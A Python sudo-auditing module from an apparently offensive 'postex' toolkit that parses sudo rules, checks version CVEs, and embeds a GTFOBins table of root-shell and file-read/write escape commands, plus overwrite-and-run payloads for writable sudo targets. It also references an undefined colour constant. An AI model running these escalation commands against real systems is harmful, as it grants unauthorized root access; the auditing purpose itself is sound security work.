#!/usr/bin/env python3
"""
Sudo Configuration Auditor

Analyzes sudo configuration for privilege escalation opportunities.
Checks sudo rules, GTFOBins matches, wildcards, writable paths,
and known sudo vulnerabilities.

Usage:
    python3 -m redshift_toolkit.postex.sudo_audit
    python3 -m redshift_toolkit.postex.sudo_audit --format json

Author: Redshift Project — Module 20
License: MIT
"""

from __future__ import annotations

import subprocess
import re
import os
import json
import argparse
import sys
from dataclasses import dataclass, asdict
from typing import List, Dict, Optional, Tuple


# ANSI Color Constants
class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    GREY = "\033[90m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def paint(text: str, color: str, use_color: bool = True) -> str:
    """Apply color if use_color is True."""
    if not use_color:
        return text
    return f"{color}{text}{Colors.RESET}"


@dataclass
class SudoRule:
    """Individual sudo rule."""
    user: str
    hosts: str
    runas: str
    tags: str
    commands: List[str]
    raw_line: str


@dataclass
class VulnFinding:
    """Vulnerability finding."""
    severity: str  # HIGH, MEDIUM, LOW
    category: str  # GTFOBINS, WILDCARD, WRITABLE, CVE, etc.
    description: str
    exploit_commands: List[str]
    affected_rule: str


@dataclass
class SudoAuditResult:
    """Complete sudo audit results."""
    sudo_version: str
    user_can_sudo: bool
    rules: List[SudoRule]
    vulnerabilities: List[VulnFinding]
    recommendations: List[str]


# GTFOBins entries for sudo exploitation
GTFOBINS_SUDO = {
    'awk': [
        'sudo awk \'BEGIN {system("/bin/sh")}\''
    ],
    'bash': [
        'sudo bash'
    ],
    'cat': [
        'LFILE=file_to_read',
        'sudo cat "$LFILE"'
    ],
    'chmod': [
        'LFILE=file_to_change',
        'sudo chmod 6777 "$LFILE"'
    ],
    'cp': [
        'LFILE=file_to_write',
        'TF=$(mktemp)',
        'echo "DATA" > "$TF"',
        'sudo cp "$TF" "$LFILE"'
    ],
    'curl': [
        'LFILE=file_to_read',
        'sudo curl file://"$LFILE"'
    ],
    'dash': [
        'sudo dash'
    ],
    'dd': [
        'LFILE=file_to_write',
        'echo "data" | sudo dd of="$LFILE"'
    ],
    'diff': [
        'LFILE=file_to_read',
        'sudo diff --line-format=%L /dev/null "$LFILE"'
    ],
    'ed': [
        'sudo ed',
        '!/bin/sh'
    ],
    'env': [
        'sudo env /bin/sh'
    ],
    'expand': [
        'LFILE=file_to_read',
        'sudo expand "$LFILE"'
    ],
    'file': [
        'LFILE=file_to_read',
        'sudo file -f "$LFILE"'
    ],
    'find': [
        'sudo find . -exec /bin/sh \\; -quit'
    ],
    'grep': [
        'LFILE=file_to_read',
        'sudo grep \'\' "$LFILE"'
    ],
    'head': [
        'LFILE=file_to_read',
        'sudo head -c1G "$LFILE"'
    ],
    'less': [
        'sudo less /etc/profile',
        '!/bin/sh'
    ],
    'ln': [
        'LFILE=file_to_write',
        'TF=$(mktemp)',
        'echo "DATA" > "$TF"',
        'sudo ln -sf "$TF" "$LFILE"'
    ],
    'more': [
        'sudo more /etc/profile',
        '!/bin/sh'
    ],
    'mv': [
        'LFILE=file_to_write',
        'TF=$(mktemp)',
        'echo "DATA" > "$TF"',
        'sudo mv "$TF" "$LFILE"'
    ],
    'nano': [
        'sudo nano',
        '^R^X',
        'reset; sh 1>&0 2>&0'
    ],
    'nice': [
        'sudo nice /bin/sh'
    ],
    'nl': [
        'LFILE=file_to_read',
        'sudo nl -bn -w1 -s \'\' "$LFILE"'
    ],
    'nohup': [
        'sudo nohup /bin/sh -c "sh <&2 >&2"'
    ],
    'od': [
        'LFILE=file_to_read',
        'sudo od -An -c -w9999 "$LFILE"'
    ],
    'openssl': [
        'LFILE=file_to_read',
        'sudo openssl enc -in "$LFILE"'
    ],
    'perl': [
        'sudo perl -e \'exec "/bin/sh";\''
    ],
    'php': [
        'sudo php -r "system(\'/bin/sh\');"'
    ],
    'python': [
        'sudo python -c \'import os; os.system("/bin/sh")\''
    ],
    'python2': [
        'sudo python2 -c \'import os; os.system("/bin/sh")\''
    ],
    'python3': [
        'sudo python3 -c \'import os; os.system("/bin/sh")\''
    ],
    'rev': [
        'LFILE=file_to_read',
        'sudo rev "$LFILE"'
    ],
    'ruby': [
        'sudo ruby -e \'exec "/bin/sh"\''
    ],
    'sed': [
        'LFILE=file_to_read',
        'sudo sed \'\' "$LFILE"'
    ],
    'sh': [
        'sudo sh'
    ],
    'sort': [
        'LFILE=file_to_read',
        'sudo sort -m "$LFILE"'
    ],
    'tail': [
        'LFILE=file_to_read',
        'sudo tail -c1G "$LFILE"'
    ],
    'tar': [
        'sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh'
    ],
    'timeout': [
        'sudo timeout 7d /bin/sh'
    ],
    'ul': [
        'LFILE=file_to_read',
        'sudo ul "$LFILE"'
    ],
    'unexpand': [
        'LFILE=file_to_read',
        'sudo unexpand -t99999999 "$LFILE"'
    ],
    'uniq': [
        'LFILE=file_to_read',
        'sudo uniq "$LFILE"'
    ],
    'vi': [
        'sudo vi -c \':!/bin/sh\' /dev/null'
    ],
    'vim': [
        'sudo vim -c \':!/bin/sh\''
    ],
    'wc': [
        'LFILE=file_to_read',
        'sudo wc --files0-from="$LFILE"'
    ],
    'wget': [
        'LFILE=file_to_read',
        'sudo wget -i "$LFILE"'
    ],
    'xargs': [
        'sudo xargs -a /dev/null sh'
    ],
    'zsh': [
        'sudo zsh'
    ]
}

# Common dangerous wildcards
DANGEROUS_WILDCARDS = [
    '*',
    '?',
    '[',
    '*.sh',
    '*.py',
    '*.pl',
    '/path/*',
    '*command*'
]

# Environment variables that can be dangerous
DANGEROUS_ENV_VARS = [
    'PATH',
    'LD_LIBRARY_PATH',
    'LD_PRELOAD',
    'PYTHON_PATH',
    'PERL5LIB',
    'PYTHONPATH'
]


def run_command(cmd: List[str]) -> Tuple[str, int]:
    """Execute command and return output and exit code."""
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return result.stdout.strip(), result.returncode
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return "", 1


def get_sudo_version() -> str:
    """Get sudo version."""
    output, _ = run_command(["sudo", "--version"])
    if output:
        first_line = output.split('\n')[0]
        return first_line
    return "Unknown"


def parse_sudo_rules(sudo_l_output: str) -> List[SudoRule]:
    """Parse sudo -l output into structured rules."""
    rules = []
    
    lines = sudo_l_output.split('\n')
    current_rule = None
    
    for line in lines:
        line = line.strip()
        
        # Skip empty lines and headers
        if not line or line.startswith('Matching') or line.startswith('User'):
            continue
        
        # Check if line starts with parentheses (runas specification)
        if line.startswith('('):
            # Parse rule line: (runas) [tags:] commands
            match = re.match(r'\(([^)]+)\)\s*([^:]*:)?\s*(.*)', line)
            if match:
                runas = match.group(1)
                tags = match.group(2).rstrip(':') if match.group(2) else ""
                commands = match.group(3)
                
                current_rule = SudoRule(
                    user="current_user",
                    hosts="ALL",
                    runas=runas,
                    tags=tags,
                    commands=[commands] if commands else [],
                    raw_line=line
                )
                rules.append(current_rule)
            continue
        
        # Check if it's a continuation line (command list)
        if current_rule and (line.startswith('/') or line.startswith('ALL')):
            current_rule.commands.append(line)
            continue
        
        # Full rule line format: user hosts = (runas) [tags:] commands
        if '=' in line:
            parts = line.split('=', 1)
            if len(parts) == 2:
                left_part = parts[0].strip()
                right_part = parts[1].strip()
                
                # Parse left side (user hosts)
                left_parts = left_part.split()
                user = left_parts[0] if left_parts else "current_user"
                hosts = ' '.join(left_parts[1:]) if len(left_parts) > 1 else "ALL"
                
                # Parse right side (runas) [tags:] commands
                match = re.match(r'\(([^)]+)\)\s*([^:]*:)?\s*(.*)', right_part)
                if match:
                    runas = match.group(1)
                    tags = match.group(2).rstrip(':') if match.group(2) else ""
                    commands = match.group(3)
                    
                    rule = SudoRule(
                        user=user,
                        hosts=hosts,
                        runas=runas,
                        tags=tags,
                        commands=[commands] if commands else [],
                        raw_line=line
                    )
                    rules.append(rule)
                    current_rule = rule
    
    return rules


def check_gtfobins_vulns(rules: List[SudoRule]) -> List[VulnFinding]:
    """Check for GTFOBins vulnerabilities in sudo rules."""
    vulns = []
    
    for rule in rules:
        for command in rule.commands:
            # Extract binary name from command
            cmd_parts = command.strip().split()
            if not cmd_parts:
                continue
            
            binary_path = cmd_parts[0]
            binary_name = os.path.basename(binary_path)
            
            # Check if binary is in GTFOBins
            if binary_name in GTFOBINS_SUDO:
                exploit_commands = GTFOBINS_SUDO[binary_name]
                
                vuln = VulnFinding(
                    severity="HIGH",
                    category="GTFOBINS",
                    description=f"Binary '{binary_name}' can be exploited for privilege escalation via GTFOBins",
                    exploit_commands=exploit_commands,
                    affected_rule=rule.raw_line
                )
                vulns.append(vuln)
    
    return vulns


def check_wildcard_vulns(rules: List[SudoRule]) -> List[VulnFinding]:
    """Check for dangerous wildcards in sudo rules."""
    vulns = []
    
    for rule in rules:
        for command in rule.commands:
            for wildcard in DANGEROUS_WILDCARDS:
                if wildcard in command:
                    vuln = VulnFinding(
                        severity="HIGH",
                        category="WILDCARD",
                        description=f"Command contains dangerous wildcard '{wildcard}' that may allow privilege escalation",
                        exploit_commands=[
                            f"# Wildcard exploitation depends on specific context",
                            f"# Command: {command}",
                            f"# Research specific wildcard bypass techniques"
                        ],
                        affected_rule=rule.raw_line
                    )
                    vulns.append(vuln)
    
    return vulns


def check_writable_paths(rules: List[SudoRule]) -> List[VulnFinding]:
    """Check for writable scripts/binaries in sudo rules."""
    vulns = []
    
    for rule in rules:
        for command in rule.commands:
            cmd_parts = command.strip().split()
            if not cmd_parts:
                continue
            
            binary_path = cmd_parts[0]
            
            # Skip if it's a wildcard or ALL
            if binary_path in ['ALL', '*'] or '*' in binary_path:
                continue
            
            # Check if file exists and is writable
            if os.path.exists(binary_path):
                if os.access(binary_path, os.W_OK):
                    vuln = VulnFinding(
                        severity="HIGH",
                        category="WRITABLE",
                        description=f"Sudo command points to writable file '{binary_path}'",
                        exploit_commands=[
                            f"# Overwrite the binary with malicious content",
                            f"echo '#!/bin/bash' > {binary_path}",
                            f"echo '/bin/sh' >> {binary_path}",
                            f"sudo {binary_path}"
                        ],
                        affected_rule=rule.raw_line
                    )
                    vulns.append(vuln)
                else:
                    # Check if parent directory is writable
                    parent_dir = os.path.dirname(binary_path)
                    if os.access(parent_dir, os.W_OK):
                        vuln = VulnFinding(
                            severity="MEDIUM",
                            category="WRITABLE",
                            description=f"Parent directory of sudo command '{parent_dir}' is writable",
                            exploit_commands=[
                                f"# Move original and replace with malicious version",
                                f"mv {binary_path} {binary_path}.backup",
                                f"echo '#!/bin/bash' > {binary_path}",
                                f"echo '/bin/sh' >> {binary_path}",
                                f"chmod +x {binary_path}",
                                f"sudo {binary_path}"
                            ],
                            affected_rule=rule.raw_line
                        )
                        vulns.append(vuln)
    
    return vulns


def check_env_vulns(rules: List[SudoRule]) -> List[VulnFinding]:
    """Check for dangerous environment variable preservation."""
    vulns = []
    
    for rule in rules:
        if 'SETENV' in rule.tags or 'env_keep' in rule.raw_line:
            vuln = VulnFinding(
                severity="MEDIUM",
                category="ENVIRONMENT",
                description="Rule allows environment variable preservation (SETENV or env_keep)",
                exploit_commands=[
                    "# Environment variable attacks depend on specific variables preserved",
                    "# Common attack vectors:",
                    "export LD_PRELOAD=/path/to/malicious.so",
                    "export PATH=/tmp:$PATH",
                    "# Then execute the sudo command"
                ],
                affected_rule=rule.raw_line
            )
            vulns.append(vuln)
    
    return vulns


def check_sudo_cves() -> List[VulnFinding]:
    """Check for known sudo CVEs based on version."""
    vulns = []
    
    version_output = get_sudo_version()
    
    # CVE-2021-3156 (Baron Samedit)
    if "sudo version 1." in version_output.lower():
        version_match = re.search(r'sudo version 1\.(\d+)\.(\d+)', version_output.lower())
        if version_match:
            major = int(version_match.group(1))
            minor = int(version_match.group(2))
            
            # Vulnerable versions: 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1
            if (major == 8 and 2 <= minor <= 31) or (major == 9 and 0 <= minor <= 5):
                vuln = VulnFinding(
                    severity="HIGH",
                    category="CVE",
                    description=f"Sudo version vulnerable to CVE-2021-3156 (Baron Samedit): {version_output}",
                    exploit_commands=[
                        "# CVE-2021-3156 exploitation requires specific exploit code",
                        "# Check for public exploits matching your sudo version",
                        "# Example exploit patterns:",
                        "sudoedit -s /",
                        "EDITOR='vim -- /etc/passwd' sudoedit /etc/motd"
                    ],
                    affected_rule="Global sudo vulnerability"
                )
                vulns.append(vuln)
    
    return vulns


def generate_recommendations(vulns: List[VulnFinding]) -> List[str]:
    """Generate security recommendations based on findings."""
    recommendations = []
    
    categories = {v.category for v in vulns}
    
    if "GTFOBINS" in categories:
        recommendations.append("Review sudo rules for binaries listed in GTFOBins")
        recommendations.append("Consider using command-specific parameters instead of allowing full binary access")
    
    if "WILDCARD" in categories:
        recommendations.append("Remove wildcard characters from sudo rules")
        recommendations.append("Specify exact commands and paths instead of using wildcards")
    
    if "WRITABLE" in categories:
        recommendations.append("Ensure sudo-accessible binaries are not writable by non-root users")
        recommendations.append("Set proper file permissions (755 or 750) on sudo-accessible files")
    
    if "ENVIRONMENT" in categories:
        recommendations.append("Avoid using SETENV tag unless absolutely necessary")
        recommendations.append("Carefully review env_keep settings in sudoers")
    
    if "CVE" in categories:
        recommendations.append("Update sudo to the latest version")
        recommendations.append("Apply security patches for known sudo vulnerabilities")
    
    # General recommendations
    recommendations.extend([
        "Use 'sudo -l' regularly to review current sudo permissions",
        "Implement principle of least privilege for sudo rules",
        "Consider using sudoreplay for sudo session logging",
        "Regular audit of sudoers file and included configurations"
    ])
    
    return recommendations


def audit_sudo() -> SudoAuditResult:
    """Perform comprehensive sudo audit."""
    print(paint("🔍 Auditing sudo configuration...", Colors.CYAN, True))
    
    # Get sudo version
    sudo_version = get_sudo_version()
    
    # Check if user can use sudo
    output, exit_code = run_command(["sudo", "-n", "true"])
    user_can_sudo = (exit_code == 0)
    
    # Get sudo rules
    sudo_l_output, _ = run_command(["sudo", "-l"])
    rules = parse_sudo_rules(sudo_l_output)
    
    print(paint(f"📋 Found {len(rules)} sudo rules", Colors.YELLOW, True))
    
    # Check for vulnerabilities
    vulns = []
    
    print(paint("🔍 Checking GTFOBins matches...", Colors.CYAN, True))
    vulns.extend(check_gtfobins_vulns(rules))
    
    print(paint("🔍 Checking wildcards...", Colors.CYAN, True))
    vulns.extend(check_wildcard_vulns(rules))
    
    print(paint("🔍 Checking file permissions...", Colors.CYAN, True))
    vulns.extend(check_writable_paths(rules))
    
    print(paint("🔍 Checking environment variables...", Colors.CYAN, True))
    vulns.extend(check_env_vulns(rules))
    
    print(paint("🔍 Checking known CVEs...", Colors.CYAN, True))
    vulns.extend(check_sudo_cves())
    
    # Generate recommendations
    recommendations = generate_recommendations(vulns)
    
    return SudoAuditResult(
        sudo_version=sudo_version,
        user_can_sudo=user_can_sudo,
        rules=rules,
        vulnerabilities=vulns,
        recommendations=recommendations
    )


def print_results(result: SudoAuditResult, use_color: bool = True) -> None:
    """Print audit results."""
    print(paint(f"\n🎯 Sudo Audit Complete", Colors.GREEN, use_color))
    print(paint(f"📊 Sudo Version: {result.sudo_version}", Colors.YELLOW, use_color))
    print(paint(f"🔑 User can sudo: {'Yes' if result.user_can_sudo else 'No'}", Colors.YELLOW, use_color))
    print(paint(f"📋 Total rules: {len(result.rules)}", Colors.YELLOW, use_color))
    print(paint(f"🚨 Vulnerabilities found: {len(result.vulnerabilities)}", Colors.RED, use_color))
    
    # Group vulnerabilities by severity
    high_vulns = [v for v in result.vulnerabilities if v.severity == "HIGH"]
    medium_vulns = [v for v in result.vulnerabilities if v.severity == "MEDIUM"]
    low_vulns = [v for v in result.vulnerabilities if v.severity == "LOW"]
    
    if high_vulns:
        print(paint(f"\n🔥 HIGH SEVERITY VULNERABILITIES ({len(high_vulns)}):", Colors.RED, use_color))
        print(paint("="*60, Colors.RED, use_color))
        
        for vuln in high_vulns:
            print(paint(f"\n📍 {vuln.category}: {vuln.description}", Colors.BOLD, use_color))
            print(paint(f"   Rule: {vuln.affected_rule}", Colors.GREY, use_color))
            print(paint(f"   💥 Exploit Commands:", Colors.YELLOW, use_color))
            for cmd in vuln.exploit_commands:
                print(paint(f"      {cmd}", Colors.WHITE, use_color))
    
    if medium_vulns:
        print(paint(f"\n⚠️  MEDIUM SEVERITY VULNERABILITIES ({len(medium_vulns)}):", Colors.YELLOW, use_color))
        for vuln in medium_vulns:
            print(paint(f"   • {vuln.description}", Colors.YELLOW, use_color))
    
    if result.recommendations:
        print(paint(f"\n💡 RECOMMENDATIONS:", Colors.CYAN, use_color))
        for i, rec in enumerate(result.recommendations[:10], 1):  # Limit to top 10
            print(paint(f"   {i}. {rec}", Colors.CYAN, use_color))


def main():
    """Main function."""
    parser = argparse.ArgumentParser(
        description="Sudo Configuration Auditor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    # Basic sudo audit
    python3 -m redshift_toolkit.postex.sudo_audit
    
    # JSON output
    python3 -m redshift_toolkit.postex.sudo_audit --format json
    
    # No color output
    python3 -m redshift_toolkit.postex.sudo_audit --no-color

Note:
    - Requires sudo access to analyze configuration
    - Some checks may require actual file access
    - Test exploit commands in controlled environment
"""
    )
    
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="Output format (default: text)"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    
    args = parser.parse_args()
    use_color = not args.no_color
    
    try:
        # Perform audit
        result = audit_sudo()
        
        if args.format == "json":
            print(json.dumps(asdict(result), indent=2, default=str))
        else:
            print_results(result, use_color)
        
    except KeyboardInterrupt:
        print(paint("\n❌ Audit interrupted", Colors.RED, use_color))
        sys.exit(1)
    except Exception as e:
        print(paint(f"❌ Error during audit: {e}", Colors.RED, use_color))
        sys.exit(1)


if __name__ == "__main__":
    main()
